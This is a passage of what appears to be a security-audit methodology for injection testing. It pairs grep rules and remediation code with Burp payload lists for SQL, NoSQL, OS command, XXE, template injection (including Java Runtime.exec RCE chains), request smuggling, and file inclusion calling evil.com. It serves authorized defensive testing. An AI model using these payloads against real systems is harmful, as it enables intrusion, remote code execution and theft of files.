# Pass 05: Injection & Input Validation

**Weight:** 12% of Security Score
**OWASP Mapping:** A05:2025 (Injection), WSTG-INPV-01 through WSTG-INPV-19
**Focus:** All injection attack vectors across all input surfaces — SQL, NoSQL, OS command, LDAP, XML/XXE, SSTI, HTTP header/parameter/request smuggling, ORM injection, and code injection (LFI/RFI). Injection has 30K+ CVEs for XSS alone and remains one of the most impactful vulnerability classes.
**Automation Level:** 80% fully automated, 15% AI-assisted, 5% manual judgment

---

## Tier 0: Static Analysis

### 0.1 Parameterized Query Usage

Verify the application uses parameterized queries or ORM abstractions instead of string concatenation for database queries.

**Grep patterns — SAFE patterns (should exist):**

```
# Prisma ORM (safe by default)
pattern: (prisma\.\w+\.(findMany|findUnique|findFirst|create|update|delete|upsert))
glob: "*.{js,ts,mjs}"

# Drizzle ORM (safe by default)
pattern: (db\.(select|insert|update|delete)|from\(|\.where\()
glob: "*.{js,ts,mjs}"

# TypeORM (safe with proper usage)
pattern: (\.createQueryBuilder|getRepository|\.find\(|\.findOne\()
glob: "*.{js,ts}"

# Sequelize (safe with proper usage)
pattern: (Model\.(findAll|findOne|create|update|destroy)\s*\()
glob: "*.{js,ts}"

# Mongoose (safe with proper usage)
pattern: (\.find\(|\.findOne\(|\.findById\(|\.aggregate\()
glob: "*.{js,ts}"

# Python SQLAlchemy (safe with proper usage)
pattern: (session\.query|session\.execute\s*\(\s*text\s*\(|select\s*\()
glob: "*.py"

# Prepared statements (Node mysql2)
pattern: (\.execute\s*\(\s*['"]|\.query\s*\(\s*['"].*\?\s*['"],\s*\[)
glob: "*.{js,ts}"
```

**Grep patterns — UNSAFE patterns (flag these):**

```
# String concatenation in SQL queries
pattern: (query|execute|raw|sql)\s*\(\s*[`'"].*\$\{|.*\+\s*req\.|.*\+\s*request\.)
glob: "*.{js,ts,py,php,rb}"

# Template literals in queries
pattern: (query|execute)\s*\(\s*`[^`]*\$\{
glob: "*.{js,ts,mjs}"

# f-string in Python SQL
pattern: (cursor\.execute|\.raw)\s*\(\s*f['"]
glob: "*.py"

# String format in Python SQL
pattern: (cursor\.execute|\.raw)\s*\(\s*['"].*%s.*['"].*%\s*\(
glob: "*.py"

# PHP string interpolation in SQL
pattern: (mysql_query|mysqli_query|->query)\s*\(\s*["'].*\$
glob: "*.php"

# Raw SQL usage (may or may not be safe — investigate)
pattern: (\.raw\s*\(|Prisma\.\$queryRaw|Prisma\.\$executeRaw|rawQuery|raw_sql)
glob: "*.{js,ts,py,php,rb}"

# Knex raw
pattern: (knex\.raw|\.whereRaw|\.orderByRaw|\.havingRaw)
glob: "*.{js,ts}"
```

### 0.2 Input Validation Library Usage

Check for schema validation on user inputs.

**Grep patterns:**

```
# Zod validation (good)
pattern: (z\.(object|string|number|array|enum)|\.parse\(|\.safeParse\()
glob: "*.{js,ts,tsx}"

# Yup validation (good)
pattern: (yup\.(object|string|number|array)|\.validate\(|\.isValid\()
glob: "*.{js,ts,tsx}"

# Joi validation (good)
pattern: (Joi\.(object|string|number|array)|\.validate\()
glob: "*.{js,ts}"

# class-validator (NestJS)
pattern: (@IsString|@IsNumber|@IsEmail|@MinLength|@MaxLength|@IsNotEmpty|@ValidateNested)
glob: "*.ts"

# Express-validator
pattern: (body\(|param\(|query\(|check\(|validationResult)
glob: "*.{js,ts}"

# Python pydantic
pattern: (BaseModel|Field\(|validator|@validate)
glob: "*.py"

# Laravel validation
pattern: (validate\(\s*\$request|Validator::make|\$this->validate\()
glob: "*.php"
```

**What to look for:**
- Input validation present on ALL user-facing endpoints
- Validation on server side (not just client side)
- Allowlist validation preferred over blocklist

### 0.3 Output Encoding

Check that user-supplied data is properly encoded when rendered.

**Grep patterns:**

```
# React JSX (auto-escapes by default — but check for dangerouslySetInnerHTML)
pattern: dangerouslySetInnerHTML
glob: "*.{jsx,tsx}"

# Vue v-html (unsafe)
pattern: v-html
glob: "*.vue"

# Angular [innerHTML] (unsafe without sanitization)
pattern: \[innerHTML\]|bypassSecurityTrustHtml
glob: "*.{ts,html}"

# EJS unescaped output
pattern: <%-
glob: "*.ejs"

# Handlebars/Mustache unescaped
pattern: \{\{\{
glob: "*.{hbs,handlebars,mustache}"

# Pug/Jade unescaped
pattern: !=\s|!{
glob: "*.{pug,jade}"

# Python Jinja2 |safe filter
pattern: \|\s*safe
glob: "*.{html,jinja,jinja2}"

# PHP echo without htmlspecialchars
pattern: (echo\s+\$|print\s+\$|<\?=\s*\$)
glob: "*.php"
```

### 0.4 Dangerous Function Usage

Search for functions that execute code or system commands.

**Grep patterns:**

```
# JavaScript eval and equivalents
pattern: (eval\s*\(|Function\s*\(|setTimeout\s*\(\s*['"]|setInterval\s*\(\s*['"]|new\s+Function\s*\()
glob: "*.{js,ts,jsx,tsx,mjs}"

# Node.js command execution
pattern: (child_process|exec\s*\(|execSync|spawn\s*\(|execFile|fork\s*\()
glob: "*.{js,ts,mjs}"

# Python command execution
pattern: (os\.system|os\.popen|subprocess\.(call|run|Popen|check_output)|exec\s*\(|eval\s*\()
glob: "*.py"

# PHP command execution
pattern: (system\s*\(|exec\s*\(|shell_exec|passthru|popen|proc_open|eval\s*\(|assert\s*\()
glob: "*.php"

# Ruby command execution
pattern: (system\s*\(|exec\s*\(|`.*`|%x\{|IO\.popen|Open3)
glob: "*.rb"

# Deserialization (unsafe)
pattern: (unserialize|pickle\.loads|yaml\.load\(|JSON\.parse.*eval|ObjectInputStream|readObject)
glob: "*.{php,py,java,js,ts}"
```

**Critical findings:**
- `eval()` with user-supplied input = Critical
- `child_process.exec()` with user-supplied arguments = Critical
- `pickle.loads()` on user-supplied data = Critical
- `unserialize()` on user-supplied data = Critical

---

## Tier 1: Automated Scanning

### 1.1 SQL Injection

**Purpose:** Test all input parameters for SQL injection vulnerabilities across multiple techniques.

**Burp Scanner + Intruder Workflow:**
1. Run Burp active scan against all discovered endpoints with SQL injection checks enabled
2. For endpoints with parameters, configure Burp Intruder for targeted testing

**Detection payloads (Burp Intruder — Sniper):**

```
# Error-based detection
'
''
`
1' OR '1'='1
1' OR '1'='1' --
1' OR '1'='1' #
1 OR 1=1
" OR "1"="1

# Union-based detection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
1 UNION SELECT 1,2,3--

# Boolean-based blind detection
1' AND '1'='1
1' AND '1'='2
1 AND 1=1
1 AND 1=2

# Time-based blind detection
1' AND SLEEP(5)--
1'; WAITFOR DELAY '0:0:5'--
1' AND pg_sleep(5)--
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

# Out-of-band detection (if Burp Collaborator available)
1' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.collaborator.net\\')))--
```

**Parameter contexts to test:**
- URL query parameters: `?id=1'`
- POST body parameters: `username=admin'`
- JSON body: `{"id": "1'"}`
- Cookie values: `Cookie: session=1'`
- HTTP headers: `Referer: https://example.com?q=1'`
- ORDER BY clause: `?sort=name' ASC--`

**Response analysis:**
- SQL error messages in response body (error-based confirmed)
- Different response content for `AND 1=1` vs `AND 1=2` (blind boolean confirmed)
- Response time > 5 seconds for SLEEP payloads (blind time-based confirmed)

**Severity:** Any confirmed SQL injection = Critical

### 1.2 NoSQL Injection

**Purpose:** Test for injection in MongoDB, CouchDB, and other NoSQL databases.

**Burp Intruder Workflow:**

**Operator injection payloads:**
```
# MongoDB operator injection (JSON body)
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}

# MongoDB $where injection
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}

# Syntax injection (URL params)
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*

# Array injection
username=admin&password[$ne]=x
```

**Burp Repeater modifications:**
```
# Content-Type manipulation
# Change from application/x-www-form-urlencoded to application/json
# Then inject MongoDB operators in JSON body

# $in operator
{"username": {"$in": ["admin", "root", "superadmin"]}}

# $exists operator
{"username": {"$exists": true}, "password": {"$exists": true}}
```

**Severity:** Confirmed NoSQL injection = Critical (auth bypass) or High (data extraction)

### 1.3 OS Command Injection

**Purpose:** Test for operating system command injection in parameters that may be passed to system commands.

**Burp Scanner Workflow:**
1. Enable OS command injection checks in Burp active scan
2. Target parameters that could interact with the OS: filename, path, url, host, ip, command, cmd, exec, ping, traceroute, nslookup

**Detection payloads (Burp Intruder):**
```
# Unix command injection
; id
| id
` id `
$(id)
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; cat /etc/passwd
| cat /etc/passwd

# Windows command injection
& dir
| dir
; dir
& ping -n 5 127.0.0.1
| type C:\windows\win.ini
; whoami

# Blind command injection (timing)
; sleep 10 ;
& ping -c 10 127.0.0.1 &
| ping -n 10 127.0.0.1

# Newline injection
%0a id
%0d%0a id
\n id
```

**High-risk parameter names:**
- `filename`, `file`, `path`, `dir`, `folder`
- `url`, `uri`, `host`, `hostname`, `ip`
- `cmd`, `command`, `exec`, `run`
- `ping`, `traceroute`, `nslookup`, `dig`
- `template`, `render`, `convert`

**Severity:** Any confirmed command injection = Critical (RCE)

### 1.4 LDAP Injection

**Purpose:** Test for LDAP injection in authentication and directory search parameters.

**Burp Intruder Workflow:**

**Detection payloads:**
```
# Basic LDAP injection
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(|(password=*
```

**Target parameters:**
- `username`, `user`, `uid`, `cn`
- `search`, `query`, `filter`
- `dn`, `base`, `group`

**Response analysis:**
- All users returned = injection confirmed
- LDAP error messages = injection point confirmed
- Authentication bypass = Critical

### 1.5 XML/XXE Injection

**Purpose:** Test for XML External Entity injection in XML-accepting endpoints.

**Burp Scanner Workflow:**
1. Enable XXE checks in Burp active scanner
2. Test all endpoints that accept XML content

**XXE payloads (Burp Repeater):**
```xml
# Basic XXE — file read
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

# XXE — SSRF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

# Blind XXE — out-of-band (Burp Collaborator)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR-DOMAIN/xxe">
]>
<root>&xxe;</root>

# XInclude (when you don't control the full XML document)
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

# XXE via file upload (SVG)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

# XXE via DOCX (content in word/document.xml)
# Modify DOCX internals to include XXE payload
```

**Content-Type manipulation:**
```
# Force XML parsing
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/xhtml+xml

# SOAP endpoints
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://example.com/action"
```

**Severity:** XXE with file read = Critical. Blind XXE = High.

### 1.6 Server-Side Template Injection (SSTI)

**Purpose:** Detect template injection by sending expressions that evaluate server-side.

**Burp Intruder Workflow:**
1. Test all parameters that could be reflected in rendered output
2. Use mathematical expressions to detect evaluation

**Detection payloads (multi-engine):**
```
# Universal detection
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)

# Jinja2 (Python)
{{config}}
{{self.__init__.__globals__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${object.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(object.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Velocity (Java)
#set($x="")$x.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# Pebble (Java)
{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}

# EJS (Node.js)
<%= process.env %>
<%= require('child_process').execSync('id') %>
```

**Detection methodology:**
1. Send `${7*7}` — if response contains `49`, template injection confirmed
2. Send `{{7*7}}` — if response contains `49`, likely Jinja2/Twig/Handlebars
3. Send `<%= 7*7 %>` — if response contains `49`, likely ERB/EJS
4. Send `#{7*7}` — if response contains `49`, likely Slim/Ruby
5. If detected, identify the specific template engine for escalation

**Severity:** Confirmed SSTI = Critical (typically leads to RCE)

### 1.7 HTTP Header Injection

**Purpose:** Test for injection in HTTP headers, particularly Host header and X-Forwarded-For.

**Burp Repeater Workflow:**

```
# Host header injection (password reset poisoning)
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# X-Forwarded-Host injection
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@example.com

# Dual Host headers
GET / HTTP/1.1
Host: target.com
Host: evil.com

# Host header with port
GET / HTTP/1.1
Host: target.com:evil.com

# X-Forwarded-For injection (IP spoofing for rate limit bypass)
GET /api/login HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1
X-Real-IP: 127.0.0.1

# CRLF injection in headers
GET / HTTP/1.1
Host: target.com%0d%0aSet-Cookie:%20malicious=true
```

**Severity:** Host header poisoning in password reset = High. CRLF injection = Medium.

### 1.8 HTTP Parameter Pollution

**Purpose:** Test how the application handles duplicate parameters.

**Burp Intruder Workflow:**

```
# Duplicate URL parameters
GET /search?category=safe&category=admin HTTP/1.1

# Duplicate POST parameters
POST /transfer HTTP/1.1
amount=100&amount=1000000

# Mixed GET and POST
POST /action?admin=false HTTP/1.1
Content-Type: application/x-www-form-urlencoded

admin=true

# Array parameter injection
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=user&role[]=admin

# Parameter encoding variations
POST /action HTTP/1.1
role=user&role=admin
role=user&%72ole=admin
```

**Framework behavior differences:**
- ASP.NET: concatenates with comma (`user,admin`)
- PHP: takes last value (`admin`)
- Python/Django: takes last value
- Node/Express: array or last depending on parser
- Java/Spring: takes first value (`user`)

### 1.9 HTTP Request Smuggling

**Purpose:** Detect request smuggling vulnerabilities between front-end and back-end servers.

**Burp Scanner Workflow:**
1. Enable HTTP request smuggling detection in Burp active scanner
2. Run timing-based detection tests

**Detection tests (Burp Repeater — USE WITH CAUTION):**

```
# CL.TE detection (front-end uses Content-Length, back-end uses Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL detection (front-end uses Transfer-Encoding, back-end uses Content-Length)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE detection (both support TE, but one can be obfuscated)
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding: chunked
Transfer-Encoding : chunked

0
```

**SAFETY NOTE:** Request smuggling tests can affect other users. Only test on isolated staging environments or localhost. NEVER test in production without explicit authorization.

**Severity:** Confirmed request smuggling = Critical

### 1.10 ORM Injection

**Purpose:** Test for injection through ORM query interfaces that may not be fully parameterized.

**Burp Intruder Workflow:**

```
# Sequelize operator injection
# If using query params directly in where clause:
?where[role]=admin
?where[$or][0][role]=admin
?where[$ne]=null

# TypeORM injection via raw query fragments
?order=name; DROP TABLE users--
?sort=name ASC, (SELECT password FROM users LIMIT 1)

# Mongoose injection
?filter[$gt]=
?filter[$regex]=.*
?filter[$where]=function(){return true}

# Django ORM injection
?filter__contains=test
?filter__startswith=admin
?filter__regex=.*
```

### 1.11 Code Injection (LFI/RFI)

**Purpose:** Test for Local File Inclusion and Remote File Inclusion vulnerabilities.

**Burp Scanner Workflow:**
1. Enable LFI/RFI checks in Burp active scanner
2. Target parameters that reference files or templates

**LFI payloads (Burp Intruder):**
```
# Linux LFI
../../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252f..%252fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php

# Windows LFI
..\..\..\..\windows\win.ini
....\\....\\....\\windows\\win.ini
C:\windows\win.ini

# Log file inclusion (for RCE via log poisoning)
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log

# PHP wrappers
php://input
php://filter/read=convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
expect://id
```

**RFI payloads (Burp Intruder):**
```
# Remote file inclusion
http://evil.com/shell.txt
http://evil.com/shell.txt%00
https://evil.com/shell.php
\\evil.com\share\shell.php
```

**Severity:** LFI reading sensitive files = High. LFI with RCE (log poisoning) = Critical. RFI = Critical.

### 1.12 Input Validation Coverage Analysis

**Purpose:** Assess overall input validation strategy — allowlist vs blocklist, type checking, length limits.

**Code Analysis + Burp Workflow:**

**Tier 0 cross-reference:**
1. From Tier 0, count endpoints with validation vs without
2. Calculate validation coverage percentage
3. Check validation approach (allowlist vs blocklist)

**Burp testing for validation gaps:**
```
# Type confusion
?id=abc (should be numeric)
?id=1.5 (should be integer)
?id=-1 (negative value)
?id=9999999999999999 (overflow)
?id=null
?id=undefined
?id=NaN
?id=Infinity

# Length testing
?name=AAAA...AAAA (1000+ chars)
?email=a@b (too short)

# Special character testing
?name=<script>alert(1)</script>
?name='; DROP TABLE users; --
?name=../../../etc/passwd
?name=%00%0d%0a
?name=\u0000

# Encoding bypass
?name=%3Cscript%3E
?name=%253Cscript%253E (double encoding)
?name=<scr<script>ipt>
```

**Severity:** Varies by finding — see specific injection type severity.

---

## Tier 2: AI Judgment

### Question 1: Injection Surface Assessment
Based on the technology stack and code patterns, which injection types pose the highest risk? Are there any custom query builders or raw SQL usage that create unique injection surfaces?

### Question 2: Input Validation Strategy
Is the application using a consistent input validation strategy? Are there endpoints that lack validation entirely? Is validation applied at the correct layer (server-side, not just client-side)?

### Question 3: Output Encoding Completeness
Are all user-controlled outputs properly encoded for their context (HTML, JavaScript, URL, CSS, SQL)? Are there rendering contexts where encoding might be insufficient?

### Question 4: ORM Safety Assessment
Even though ORMs provide parameterization, are there raw query escape hatches being used? Are query builders receiving user input in non-parameterized positions (ORDER BY, table names)?

### Question 5: Command Injection Surface
Are there any application features that interact with the operating system (file processing, PDF generation, image conversion, email sending)? These are high-risk surfaces for command injection.

### Question 6: Deserialization Risk
Does the application deserialize user-supplied data (JSON, XML, YAML, PHP serialized, Java objects, Python pickle)? Is the deserialization library configured securely?

### Question 7: Template Injection Context
Are there any user-controlled inputs that end up in template rendering contexts? Even indirect paths (stored input rendered later) create SSTI risk.

### Question 8: Defense in Depth
Beyond input validation, what other layers of defense exist against injection? WAF rules, parameterized queries, output encoding, CSP — how many layers would an attacker need to bypass?

---

## Severity Classification

### Critical
- Confirmed SQL injection (any type — union, blind, error-based, out-of-band)
- OS command injection (any confirmed execution)
- Server-Side Template Injection with RCE potential
- XXE with file read or SSRF to internal services
- Remote File Inclusion
- NoSQL injection enabling authentication bypass
- HTTP request smuggling (confirmed with impact)
- Deserialization leading to RCE

### High
- Blind SQL injection (boolean or time-based, no direct data extraction yet)
- XXE (blind, confirmed via out-of-band only)
- Local File Inclusion reading sensitive configuration files
- LDAP injection enabling directory enumeration
- ORM injection enabling unauthorized data access
- SSTI detected but not yet escalated to RCE
- Second-order SQL injection (stored payload executed later)

### Medium
- NoSQL injection for data enumeration (non-auth bypass)
- HTTP parameter pollution enabling business logic bypass
- Host header injection (non-password-reset context)
- LFI reading non-sensitive files
- Input validation gaps on non-critical parameters
- CRLF injection in headers
- Header injection (X-Forwarded-For spoofing)

### Low
- Input validation using blocklist instead of allowlist (but functional)
- Missing length limits on input fields (but no overflow exploitation)
- Client-side only validation (server rejects invalid input anyway)
- Type coercion issues without security impact
- Parameter pollution with no observable impact

---

## False Positive Indicators

1. **WAF blocking payloads** — 403 responses to injection payloads may indicate a WAF is blocking the attack, not that the vulnerability exists. Verify by checking if the parameter is actually used in a query.
2. **Reflected input without execution** — Seeing your payload reflected in the response does not confirm injection. The payload must be interpreted/executed by the target system.
3. **Error messages from input validation** — "Invalid input" or "Bad request" responses to injection payloads indicate validation is working correctly, not that injection is possible.
4. **Timing variations** — Network latency can cause false positives in time-based blind testing. Use consistent baselines and test multiple times.
5. **ORM default behavior** — ORMs that automatically parameterize queries will safely handle injection payloads. The query will simply return no results rather than being exploited.
6. **JSON parsing errors** — Syntax errors from malformed JSON are not injection vulnerabilities. They are expected behavior from strict parsing.
7. **GraphQL type errors** — GraphQL returning type validation errors for injection payloads is the type system working correctly.
8. **NoSQL operator rejection** — MongoDB rejecting `$ne` operators in user input means the application sanitizes operators, which is correct behavior.

---

## Remediation

### SQL Injection Prevention
```javascript
// Prisma (safe by default)
const user = await prisma.user.findUnique({ where: { id: userId } });

// Raw queries with parameterization (when raw SQL is necessary)
const result = await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;

// Knex.js with parameterization
const users = await knex('users').where('id', '=', userId);

// NEVER do this:
// const result = await db.query(`SELECT * FROM users WHERE id = ${userId}`);
```

### NoSQL Injection Prevention
```javascript
// Mongoose — sanitize input
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // Strips $ operators from user input

// Manual sanitization
const sanitizedInput = Object.keys(input).reduce((acc, key) => {
  if (!key.startsWith('$')) acc[key] = input[key];
  return acc;
}, {});
```

### Command Injection Prevention
```javascript
// Use execFile instead of exec (no shell interpretation)
const { execFile } = require('child_process');
execFile('convert', [inputFile, outputFile], (error, stdout) => {
  // Arguments are passed as array, not concatenated string
});

// NEVER do this:
// exec(`convert ${inputFile} ${outputFile}`);

// Use allowlist for permitted commands/arguments
const allowedFormats = ['png', 'jpg', 'gif'];
if (!allowedFormats.includes(format)) {
  throw new Error('Invalid format');
}
```

### XXE Prevention
```javascript
// Node.js — disable external entities
const libxmljs = require('libxmljs');
const doc = libxmljs.parseXml(xmlString, {
  noent: false,    // Disable entity expansion
  dtdload: false,  // Disable DTD loading
  dtdvalid: false  // Disable DTD validation
});

// Python — use defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(source)
```

### SSTI Prevention
```javascript
// Never pass user input directly to template engines
// BAD:
res.render('template', { content: userInput });
// If template contains {{ content }}, this is safe
// But if userInput itself is used as template string, it's SSTI

// Use sandboxed template environments
// Jinja2 (Python)
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_template)  // Even this is risky
```

### Input Validation Best Practices
```javascript
// Zod schema validation (recommended)
import { z } from 'zod';

const createUserSchema = z.object({
  name: z.string().min(1).max(100).regex(/^[a-zA-Z\s'-]+$/),
  email: z.string().email().max(255),
  age: z.number().int().min(0).max(150),
  role: z.enum(['user', 'editor']),  // Allowlist, not blocklist
});

// Apply to route
app.post('/users', (req, res) => {
  const result = createUserSchema.safeParse(req.body);
  if (!result.success) return res.status(400).json({ errors: result.error.issues });
  // Use result.data — validated and typed
});
```

### Defense in Depth Strategy
1. **Layer 1:** Input validation (Zod/Yup schemas) — reject malformed input
2. **Layer 2:** Parameterized queries (Prisma/Drizzle) — prevent injection even if validation fails
3. **Layer 3:** Output encoding (React auto-escaping, DOMPurify) — prevent XSS even if stored
4. **Layer 4:** CSP headers — prevent script execution even if XSS payload is rendered
5. **Layer 5:** WAF rules — block known attack patterns at the network edge
6. **Layer 6:** Least privilege — database user can only access needed tables/operations
